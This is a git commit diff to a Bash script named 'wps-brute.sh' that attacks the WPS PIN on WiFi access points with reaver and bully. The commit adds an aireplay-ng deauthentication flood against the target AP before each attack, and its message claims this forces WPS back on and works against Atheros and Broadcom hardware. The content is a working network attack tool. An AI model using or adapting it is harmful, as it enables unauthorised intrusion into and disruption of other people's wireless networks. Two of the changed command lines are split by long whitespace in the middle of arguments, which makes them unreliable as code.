c851caf920fbde2a65c2b25736b061c95e3ddf71
Diveyez <nemofbaltimore@gmail.com>
2018-02-10 20:48:16 -0500

    More effective =)
    Deauth Sent to AP so it reinitializes WPS even when disabled.
    Atheros and Broadcom  are Vulnerable when done with repetition.

--- wps-brute.sh
+++ wps-brute.sh
@@ -5,15 +5,15 @@
 # Further testing required
 # ......
 # Intended for use with stock kali-linux packages
-# apt update && apt install reaver bully
+# apt update && apt install reaver bully airmon-ng aireplay-ng
 # Scripting user input for target, channel, interface
-echo "You need an adapter in monitor mode to use this, Just incase we are gonna do that for you!"
-sleep 1.5
-iwconfig
+#echo "You need an adapter in monitor mode to use this, Just incase we are gonna do that for you!"
+#sleep 1.5
+#iwconfig
 echo "What interface do we use?:"
 read interface
 echo "Using:" $interface;
-airmon-ng start $interface
+#airmon-ng start $interface
 echo "What channel is target on?:"
 read channel
 echo "Using Channel:" $channel;
@@ -31,10 +31,10 @@ do
     case $opt in
         "Reaver")
             echo "Reaver Attack Launching"
-            reaver -i $interface -b $tmac -c $channel -vvv -K -t 10 -f;;
+          aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1 | reaver -i $interface -b $tmac -c $channel -                                                                                                                          vv -K -JSLw;;
         "Bully")
             echo "Bully Attack Launching"
-            bully $interface -b $tmac -e $bname -c$channel -dFW;;
+            aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1 |  bully $interface -b $tmac -e $bname -c$c                                                                                                                          hannel -dBW -v 3;;
         "Quit")
             break
             ;;
@@ -50,3 +50,4 @@ do
 echo "If that didnt work, Well, We tried!"
 echo "If this failed, you may have used incorrect information, or the AP is not vulernable (WPS)"
 done
+
